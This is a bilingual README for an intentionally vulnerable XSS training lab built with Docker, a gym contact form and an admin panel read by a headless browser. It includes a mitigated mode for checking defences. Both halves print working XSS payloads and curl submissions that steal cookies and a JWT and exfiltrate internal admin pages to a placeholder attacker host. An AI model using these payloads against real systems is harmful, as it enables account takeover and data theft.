# Stored XSS Lab

## Español

Laboratorio de Stored XSS y second-order XSS para demostraciones aisladas con Docker Compose, Nginx, Node.js, PostgreSQL, Playwright y helpers manuales o automatizados de exfiltración.

Este repositorio arranca en modo intencionalmente vulnerable. Úsalo solo en un entorno controlado que te pertenezca.

### Guías

- Guía paso a paso en español: [docs/step-by-step-lab-es.md](/home/e090222/Escritorio/github-hipoloco/xsslab/docs/step-by-step-lab-es.md:1)
- Walkthrough en inglés: [docs/step-by-step-lab-en.md](/home/e090222/Escritorio/github-hipoloco/xsslab/docs/step-by-step-lab-en.md:1)
- Índice: [docs/step-by-step-lab.md](/home/e090222/Escritorio/github-hipoloco/xsslab/docs/step-by-step-lab.md:1)

### Resumen

- Un formulario público en `cross.fit` almacena contenido controlado por el atacante.
- Un panel interno en `backend.cross.fit` renderiza ese contenido más adelante.
- Una sesión privilegiada del navegador se convierte en el puente hacia un sistema interno que el atacante no puede navegar directamente.
- Un JWT almacenado del lado cliente en el navegador privilegiado puede robarse y reutilizarse explícitamente contra rutas protegidas.
- Mitigaciones como el escape contextual y CSP reducen o bloquean la explotación.

### Arquitectura

Servicios:

- `public-proxy`: único entrypoint publicado en el host por el puerto `80`
- `public-app`: landing pública del gimnasio y formulario de contacto
- `internal-proxy`: reverse proxy interno solo visible desde Docker para `backend.cross.fit`
- `internal-app`: panel interno de administración
- `worker`: navegador Playwright autenticado como admin
- `db`: PostgreSQL 16

Límite de confianza:

- `cross.fit` es accesible desde la máquina atacante.
- `backend.cross.fit` solo resuelve dentro de Docker a través de `internal-proxy`.
- El atacante no debería navegar `backend.cross.fit` directamente desde el puerto expuesto del host.

### Estructura

```text
.
├── docker-compose.yml
├── db/
├── docs/
├── nginx/
├── public-app/
├── internal-app/
├── tools/
└── worker/
```

### Requisitos

- Docker Engine + Docker Compose plugin
- `curl`
- Python 3

### Dominios locales

Variables usadas en esta guía:

- `container_machine_ip`: IP de la máquina que levanta los contenedores
- `attacker_machine_ip`: IP de la máquina atacante
- `docker_host_gateway_ip`: gateway opcional visible desde los contenedores cuando atacante y laboratorio comparten host

Máquina atacante:

```text
container_machine_ip   cross.fit
```

No agregues:

```text
container_machine_ip   backend.cross.fit
```

### Configuración

Copia `.env.example` a `.env` si quieres overrides locales.

```bash
cp .env.example .env
```

Variables soportadas:

- `LAB_MODE=vulnerable|mitigated`
- `JWT_SECRET=`
- `AUTH_TOKEN_TTL=`
- `ENABLE_CSP=`
- `RENDER_UNSAFE_HTML=`
- `POLL_INTERVAL_SECONDS=20`

Comportamiento:

- `vulnerable`: renderizado de HTML crudo habilitado, auth JWT explícita mantenida, CSP deshabilitado
- `mitigated`: salida escapada habilitada, CSP habilitado

### Levantar

```bash
docker compose up --build -d
```

Verifica estado:

```bash
docker compose ps
```

Esperado:

- `public-proxy` publicado en `0.0.0.0:80`
- `public-app`, `internal-app`, `internal-proxy`, `db` y `worker` ejecutándose
- sin puertos publicados para `3000`, `3001` o `5432`

### Reiniciar el laboratorio

```bash
./tools/reset-db.sh
```

Este reset elimina mensajes viejos, recrea `admin/admin123` e inserta mensajes de ejemplo benignos.

SQL usado:

```text
db/reset_lab.sql
```

### Validación de infraestructura

Entrada pública:

```bash
curl -i http://cross.fit/
```

Esperado: landing pública.

Aislamiento del backend:

```bash
curl -i -H "Host: backend.cross.fit" http://container_machine_ip/
```

Esperado: conexión cerrada, respuesta vacía o respuesta no exitosa.

Acceso del worker al backend interno:

```bash
docker compose exec -T worker wget -S -O- http://backend.cross.fit/login
```

Esperado: `200 OK`.

### Flujo de la app pública

Abre:

```text
http://cross.fit
```

Envía el formulario con `full_name`, `email`, `phone` opcional y `message`.

El campo `message` se almacena intencionalmente sin sanitización en modo vulnerable.

### Collector opcional

```bash
python3 tools/collector.py
```

Listener:

```text
0.0.0.0:9000
```

### Guías paso a paso

- Español: [docs/step-by-step-lab-es.md](/home/e090222/Escritorio/github-hipoloco/xsslab/docs/step-by-step-lab-es.md:1)
- English: [docs/step-by-step-lab-en.md](/home/e090222/Escritorio/github-hipoloco/xsslab/docs/step-by-step-lab-en.md:1)

### Payloads

Reemplaza placeholders:

- `attacker_machine_ip`
- `docker_host_gateway_ip` solo para validación en el mismo host

#### Sonda de ejecución

```html
<img src=x onerror="new Image().src='http://attacker_machine_ip:8000/ping'">
```

Mismo host:

```html
<img src=x onerror="new Image().src='http://docker_host_gateway_ip:8000/ping'">
```

#### Sonda de cookie

```html
<img src=x onerror="new Image().src='http://attacker_machine_ip:9000/collect?c='+encodeURIComponent(document.cookie)">
```

#### Enumeración de `localStorage`

Versión inline de referencia, demasiado grande para el campo `message` de `250` caracteres.

```html
<script>
for (let i = 0; i < localStorage.length; i += 1) {
  const key = localStorage.key(i);
  const value = localStorage.getItem(key) || '';
  new Image().src =
    'http://attacker_machine_ip:9000/collect?key=' +
    encodeURIComponent(key) +
    '&value=' +
    encodeURIComponent(value);
}
</script>
```

Helper externo:

```html
<script src="http://attacker_machine_ip:8000/tools/payload-localstorage-scan.js"></script>
```

#### Robo de JWT

```html
<img src=x onerror="new Image().src='http://attacker_machine_ip:9000/collect?jwt='+encodeURIComponent(localStorage.getItem('gym_internal_token')||'missing')">
```

#### Portada sin JWT

Versión inline de referencia:

```html
<script>
fetch('/')
  .then(r => r.text())
  .then(html => {
    const b64 = btoa(unescape(encodeURIComponent(html)));
    fetch('http://attacker_machine_ip:9000/internal-html', {
      method: 'POST',
      mode: 'no-cors',
      headers: { 'Content-Type': 'text/plain' },
      body: b64
    });
  });
</script>
```

Helper externo:

```html
<script src="http://attacker_machine_ip:8000/tools/payload-frontpage.js"></script>
```

#### Portada con JWT

Versión inline de referencia:

```html
<script>
const token = localStorage.getItem('gym_internal_token');
fetch('/', {
  headers: {
    Authorization: 'Bearer ' + token
  }
})
  .then(r => r.text())
  .then(html => {
    const b64 = btoa(unescape(encodeURIComponent(html)));
    fetch('http://attacker_machine_ip:9000/internal-html', {
      method: 'POST',
      mode: 'no-cors',
      headers: { 'Content-Type': 'text/plain' },
      body: b64
    });
  });
</script>
```

Helper externo:

```html
<script src="http://attacker_machine_ip:8000/tools/payload-frontpage-with-jwt.js"></script>
```

Esperado: el HTML decodificado debería mostrar el dashboard.

#### `/admin` con JWT

```html
<script>
const token = localStorage.getItem('gym_internal_token');
fetch('/admin', {
  headers: {
    Authorization: 'Bearer ' + token
  }
})
  .then(r => r.text())
  .then(html => {
    const b64 = btoa(unescape(encodeURIComponent(html)));
    fetch('http://attacker_machine_ip:9000/internal-html', {
      method: 'POST',
      mode: 'no-cors',
      headers: { 'Content-Type': 'text/plain' },
      body: b64
    });
  });
</script>
```

#### `/admin/messages` con JWT

Versión inline de referencia:

```html
<script>
const token = localStorage.getItem('gym_internal_token');
fetch('/admin/messages', {
  headers: {
    Authorization: 'Bearer ' + token
  }
})
  .then(r => r.text())
  .then(html => {
    const b64 = btoa(unescape(encodeURIComponent(html)));
    fetch('http://attacker_machine_ip:9000/internal-html', {
      method: 'POST',
      mode: 'no-cors',
      headers: { 'Content-Type': 'text/plain' },
      body: b64
    });
  });
</script>
```

Helper externo:

```html
<script src="http://attacker_machine_ip:8000/tools/payload-messages-with-jwt.js"></script>
```

Esperado: el HTML decodificado debería contener la tabla completa de mensajes, incluyendo email y teléfono.

#### XSS visual

```html
<script>alert('XSS ejecutado en backend.cross.fit')</script>
```

### Ejemplos con curl

#### Mensaje legítimo

```bash
curl -i -X POST http://cross.fit/contact \
  -d "full_name=Juan Perez" \
  -d "email=juan@example.com" \
  -d "phone=099123456" \
  -d "message=Quiero informacion sobre planes mensuales"
```

#### Loader externo de `localStorage`

```bash
curl -i -X POST http://cross.fit/contact \
  -d "full_name=Alumno XSS Storage JS" \
  -d "email=xss-storage-js@example.com" \
  -d "phone=099000000" \
  --data-urlencode "message=<script src=\"http://attacker_machine_ip:8000/tools/payload-localstorage-scan.js\"></script>"
```

#### Robo de JWT

```bash
curl -i -X POST http://cross.fit/contact \
  -d "full_name=Alumno XSS" \
  -d "email=xss@example.com" \
  -d "phone=099000000" \
  --data-urlencode "message=<img src=x onerror=\"new Image().src='http://attacker_machine_ip:9000/collect?jwt='+encodeURIComponent(localStorage.getItem('gym_internal_token')||'missing')\">"
```

#### Sonda de ejecución

```bash
curl -i -X POST http://cross.fit/contact \
  -d "full_name=Alumno XSS Probe" \
  -d "email=xss-probe@example.com" \
  -d "phone=099000009" \
  --data-urlencode "message=<img src=x onerror=\"new Image().src='http://attacker_machine_ip:8000/ping'\">"
```

#### Portada sin JWT

```bash
curl -i -X POST http://cross.fit/contact \
  -d "full_name=Alumno XSS Frontpage JS" \
  -d "email=xss-frontpage-js@example.com" \
  -d "phone=099000013" \
  --data-urlencode "message=<script src=\"http://attacker_machine_ip:8000/tools/payload-frontpage.js\"></script>"
```

#### Portada con JWT

```bash
curl -i -X POST http://cross.fit/contact \
  -d "full_name=Alumno XSS Root JWT JS" \
  -d "email=xss-root-jwt-js@example.com" \
  -d "phone=099000014" \
  --data-urlencode "message=<script src=\"http://attacker_machine_ip:8000/tools/payload-frontpage-with-jwt.js\"></script>"
```

#### `/admin/messages` con JWT

```bash
curl -i -X POST http://cross.fit/contact \
  -d "full_name=Alumno XSS Messages JS" \
  -d "email=xss-messages-js@example.com" \
  -d "phone=099000015" \
  --data-urlencode "message=<script src=\"http://attacker_machine_ip:8000/tools/payload-messages-with-jwt.js\"></script>"
```

### Comportamiento del worker

1. Pide un JWT a `http://backend.cross.fit/api/login`
2. Guarda ese JWT en el `localStorage` del navegador privilegiado
3. Visita `/admin/messages/next?token=...`
4. Espera a que la página renderice
5. Marca el mensaje como procesado

Logs:

```bash
docker compose logs -f worker
```

### Modo mitigado

```bash
LAB_MODE=mitigated docker compose up -d --build internal-app worker
```

Comportamiento mitigado:

- salida escapada en vez de HTML crudo
- CSP bloquea scripts y handlers inline
- el modelo JWT explícito se mantiene, pero el sink XSS deja de ejecutar

### Validar mitigación

1. Inicia un `collector.py` limpio.
2. Cambia a modo mitigado.
3. Envía los mismos payloads.
4. Observa los logs del worker.
5. Confirma que no llega exfiltración.

Esperado:

- el worker sigue procesando el mensaje
- el payload se renderiza como texto
- no llega robo de JWT al collector
- no llega ningún `POST /internal-html`

### Apagado

```bash
docker compose down -v
```

### Inseguridad intencional

Este repositorio incluye intencionalmente:

- HTML controlado por el atacante en el flujo público
- un sink vulnerable de HTML crudo en la vista interna de detalle cuando `LAB_MODE=vulnerable`
- credenciales estáticas de laboratorio (`admin/admin123`)
- un JWT guardado en `localStorage` dentro del navegador privilegiado

### Referencias

- OWASP Cross-Site Scripting:
  `https://owasp.org/www-community/attacks/xss/`
- OWASP XSS Prevention Cheat Sheet:
  `https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html`
- MDN Web Storage API:
  `https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API`
- Docker Compose Networking:
  `https://docs.docker.com/compose/how-tos/networking/`
- Nginx access controls:
  `https://nginx.org/en/docs/http/ngx_http_access_module.html`

## English

Stored XSS and second-order XSS lab for isolated demonstrations with Docker Compose, Nginx, Node.js, PostgreSQL, Playwright, and manual or scripted exfiltration helpers.

This repository starts in intentionally vulnerable mode. Use it only in a controlled environment that you own.

### Guides

- English walkthrough: [docs/step-by-step-lab-en.md](/home/e090222/Escritorio/github-hipoloco/xsslab/docs/step-by-step-lab-en.md:1)
- Spanish walkthrough: [docs/step-by-step-lab-es.md](/home/e090222/Escritorio/github-hipoloco/xsslab/docs/step-by-step-lab-es.md:1)
- Index: [docs/step-by-step-lab.md](/home/e090222/Escritorio/github-hipoloco/xsslab/docs/step-by-step-lab.md:1)

### Overview

- A public form on `cross.fit` stores attacker-controlled content.
- An internal admin panel on `backend.cross.fit` renders that content later.
- A privileged browser session becomes the bridge to an internal system that the attacker cannot browse directly.
- A JWT stored client-side in the privileged browser can be stolen and replayed explicitly against protected routes.
- Mitigations such as contextual escaping and CSP reduce or block exploitation.

### Architecture

Services:

- `public-proxy`: only published entrypoint on host port `80`
- `public-app`: public gym landing page and contact form
- `internal-proxy`: Docker-only reverse proxy for `backend.cross.fit`
- `internal-app`: internal admin panel
- `worker`: Playwright browser logged in as admin
- `db`: PostgreSQL 16

Trust boundary:

- `cross.fit` is reachable from the attacker machine.
- `backend.cross.fit` is only resolvable inside Docker through `internal-proxy`.
- The attacker should not browse `backend.cross.fit` directly from the exposed host port.

### Repository Layout

```text
.
├── docker-compose.yml
├── db/
├── docs/
├── nginx/
├── public-app/
├── internal-app/
├── tools/
└── worker/
```

### Requirements

- Docker Engine + Docker Compose plugin
- `curl`
- Python 3

### Local Domains

Variables used in this guide:

- `container_machine_ip`: IP of the machine running the lab containers
- `attacker_machine_ip`: IP of the attacker machine
- `docker_host_gateway_ip`: optional host gateway visible from containers when attacker and lab share the same host

Attacker machine:

```text
container_machine_ip   cross.fit
```

Do not add:

```text
container_machine_ip   backend.cross.fit
```

### Configuration

Copy `.env.example` to `.env` if you want local overrides.

```bash
cp .env.example .env
```

Supported variables:

- `LAB_MODE=vulnerable|mitigated`
- `JWT_SECRET=`
- `AUTH_TOKEN_TTL=`
- `ENABLE_CSP=`
- `RENDER_UNSAFE_HTML=`
- `POLL_INTERVAL_SECONDS=20`

Behavior:

- `vulnerable`: raw HTML rendering enabled, explicit JWT auth kept, CSP disabled
- `mitigated`: escaped output enabled, CSP enabled

### Start

```bash
docker compose up --build -d
```

Check status:

```bash
docker compose ps
```

Expected:

- `public-proxy` published on `0.0.0.0:80`
- `public-app`, `internal-app`, `internal-proxy`, `db`, and `worker` running
- no published host ports for `3000`, `3001`, or `5432`

### Reset The Lab

```bash
./tools/reset-db.sh
```

This reset removes old messages, recreates `admin/admin123`, and inserts benign sample messages.

SQL source:

```text
db/reset_lab.sql
```

### Infrastructure Validation

Public entrypoint:

```bash
curl -i http://cross.fit/
```

Expected: public landing page.

Backend isolation:

```bash
curl -i -H "Host: backend.cross.fit" http://container_machine_ip/
```

Expected: connection closed, empty reply, or a non-success response.

Worker access to internal backend:

```bash
docker compose exec -T worker wget -S -O- http://backend.cross.fit/login
```

Expected: `200 OK`.

### Public App Flow

Open:

```text
http://cross.fit
```

Submit the form with `full_name`, `email`, optional `phone`, and `message`.

The `message` field is intentionally stored without sanitization in vulnerable mode.

### Optional Collector

```bash
python3 tools/collector.py
```

Listener:

```text
0.0.0.0:9000
```

### Step-by-Step Walkthroughs

- English: [docs/step-by-step-lab-en.md](/home/e090222/Escritorio/github-hipoloco/xsslab/docs/step-by-step-lab-en.md:1)
- Español: [docs/step-by-step-lab-es.md](/home/e090222/Escritorio/github-hipoloco/xsslab/docs/step-by-step-lab-es.md:1)

### Payloads

Replace placeholders:

- `attacker_machine_ip`
- `docker_host_gateway_ip` only for same-host validation

#### Probe Request

```html
<img src=x onerror="new Image().src='http://attacker_machine_ip:8000/ping'">
```

Same-host:

```html
<img src=x onerror="new Image().src='http://docker_host_gateway_ip:8000/ping'">
```

#### Cookie Probe

```html
<img src=x onerror="new Image().src='http://attacker_machine_ip:9000/collect?c='+encodeURIComponent(document.cookie)">
```

#### `localStorage` Enumeration

Inline reference version, too large for the `250` character `message` field.

```html
<script>
for (let i = 0; i < localStorage.length; i += 1) {
  const key = localStorage.key(i);
  const value = localStorage.getItem(key) || '';
  new Image().src =
    'http://attacker_machine_ip:9000/collect?key=' +
    encodeURIComponent(key) +
    '&value=' +
    encodeURIComponent(value);
}
</script>
```

External helper:

```html
<script src="http://attacker_machine_ip:8000/tools/payload-localstorage-scan.js"></script>
```

#### JWT Theft

```html
<img src=x onerror="new Image().src='http://attacker_machine_ip:9000/collect?jwt='+encodeURIComponent(localStorage.getItem('gym_internal_token')||'missing')">
```

#### Front Page Without JWT

Inline reference version:

```html
<script>
fetch('/')
  .then(r => r.text())
  .then(html => {
    const b64 = btoa(unescape(encodeURIComponent(html)));
    fetch('http://attacker_machine_ip:9000/internal-html', {
      method: 'POST',
      mode: 'no-cors',
      headers: { 'Content-Type': 'text/plain' },
      body: b64
    });
  });
</script>
```

External helper:

```html
<script src="http://attacker_machine_ip:8000/tools/payload-frontpage.js"></script>
```

#### Front Page With JWT

Inline reference version:

```html
<script>
const token = localStorage.getItem('gym_internal_token');
fetch('/', {
  headers: {
    Authorization: 'Bearer ' + token
  }
})
  .then(r => r.text())
  .then(html => {
    const b64 = btoa(unescape(encodeURIComponent(html)));
    fetch('http://attacker_machine_ip:9000/internal-html', {
      method: 'POST',
      mode: 'no-cors',
      headers: { 'Content-Type': 'text/plain' },
      body: b64
    });
  });
</script>
```

External helper:

```html
<script src="http://attacker_machine_ip:8000/tools/payload-frontpage-with-jwt.js"></script>
```

Expected: decoded HTML should show the dashboard.

#### `/admin` With JWT

```html
<script>
const token = localStorage.getItem('gym_internal_token');
fetch('/admin', {
  headers: {
    Authorization: 'Bearer ' + token
  }
})
  .then(r => r.text())
  .then(html => {
    const b64 = btoa(unescape(encodeURIComponent(html)));
    fetch('http://attacker_machine_ip:9000/internal-html', {
      method: 'POST',
      mode: 'no-cors',
      headers: { 'Content-Type': 'text/plain' },
      body: b64
    });
  });
</script>
```

#### `/admin/messages` With JWT

Inline reference version:

```html
<script>
const token = localStorage.getItem('gym_internal_token');
fetch('/admin/messages', {
  headers: {
    Authorization: 'Bearer ' + token
  }
})
  .then(r => r.text())
  .then(html => {
    const b64 = btoa(unescape(encodeURIComponent(html)));
    fetch('http://attacker_machine_ip:9000/internal-html', {
      method: 'POST',
      mode: 'no-cors',
      headers: { 'Content-Type': 'text/plain' },
      body: b64
    });
  });
</script>
```

External helper:

```html
<script src="http://attacker_machine_ip:8000/tools/payload-messages-with-jwt.js"></script>
```

Expected: decoded HTML should contain the full message table, including email and phone.

#### Visual XSS

```html
<script>alert('XSS ejecutado en backend.cross.fit')</script>
```

### curl Examples

#### Legitimate Message

```bash
curl -i -X POST http://cross.fit/contact \
  -d "full_name=Juan Perez" \
  -d "email=juan@example.com" \
  -d "phone=099123456" \
  -d "message=Quiero informacion sobre planes mensuales"
```

#### `localStorage` External Loader

```bash
curl -i -X POST http://cross.fit/contact \
  -d "full_name=Alumno XSS Storage JS" \
  -d "email=xss-storage-js@example.com" \
  -d "phone=099000000" \
  --data-urlencode "message=<script src=\"http://attacker_machine_ip:8000/tools/payload-localstorage-scan.js\"></script>"
```

#### JWT Theft

```bash
curl -i -X POST http://cross.fit/contact \
  -d "full_name=Alumno XSS" \
  -d "email=xss@example.com" \
  -d "phone=099000000" \
  --data-urlencode "message=<img src=x onerror=\"new Image().src='http://attacker_machine_ip:9000/collect?jwt='+encodeURIComponent(localStorage.getItem('gym_internal_token')||'missing')\">"
```

#### Probe Request

```bash
curl -i -X POST http://cross.fit/contact \
  -d "full_name=Alumno XSS Probe" \
  -d "email=xss-probe@example.com" \
  -d "phone=099000009" \
  --data-urlencode "message=<img src=x onerror=\"new Image().src='http://attacker_machine_ip:8000/ping'\">"
```

#### Front Page Without JWT

```bash
curl -i -X POST http://cross.fit/contact \
  -d "full_name=Alumno XSS Frontpage JS" \
  -d "email=xss-frontpage-js@example.com" \
  -d "phone=099000013" \
  --data-urlencode "message=<script src=\"http://attacker_machine_ip:8000/tools/payload-frontpage.js\"></script>"
```

#### Front Page With JWT

```bash
curl -i -X POST http://cross.fit/contact \
  -d "full_name=Alumno XSS Root JWT JS" \
  -d "email=xss-root-jwt-js@example.com" \
  -d "phone=099000014" \
  --data-urlencode "message=<script src=\"http://attacker_machine_ip:8000/tools/payload-frontpage-with-jwt.js\"></script>"
```

#### `/admin/messages` With JWT

```bash
curl -i -X POST http://cross.fit/contact \
  -d "full_name=Alumno XSS Messages JS" \
  -d "email=xss-messages-js@example.com" \
  -d "phone=099000015" \
  --data-urlencode "message=<script src=\"http://attacker_machine_ip:8000/tools/payload-messages-with-jwt.js\"></script>"
```

### Worker Behavior

1. Requests a JWT from `http://backend.cross.fit/api/login`
2. Stores that JWT in privileged browser `localStorage`
3. Visits `/admin/messages/next?token=...`
4. Waits for the page to render
5. Marks the message as processed

Logs:

```bash
docker compose logs -f worker
```

### Mitigation Mode

```bash
LAB_MODE=mitigated docker compose up -d --build internal-app worker
```

Mitigated behavior:

- escaped output instead of raw HTML
- CSP blocks inline scripts and handlers
- explicit JWT model remains, but the XSS sink no longer executes

### Validate Mitigation

1. Start a fresh `collector.py`.
2. Switch to mitigated mode.
3. Submit the same payloads.
4. Watch the worker logs.
5. Confirm that no exfiltration arrives.

Expected:

- the worker still processes the message
- the payload is rendered as text
- no JWT theft reaches the collector
- no `/internal-html` POST reaches the collector

### Shutdown

```bash
docker compose down -v
```

### Intentional Insecurity

This repository intentionally includes:

- stored attacker-controlled HTML in the public flow
- a vulnerable raw HTML sink in the internal detail view when `LAB_MODE=vulnerable`
- static lab credentials (`admin/admin123`)
- a JWT stored in `localStorage` inside the privileged browser

### References

- OWASP Cross-Site Scripting:
  `https://owasp.org/www-community/attacks/xss/`
- OWASP XSS Prevention Cheat Sheet:
  `https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html`
- MDN Web Storage API:
  `https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API`
- Docker Compose Networking:
  `https://docs.docker.com/compose/how-tos/networking/`
- Nginx access controls:
  `https://nginx.org/en/docs/http/ngx_http_access_module.html`
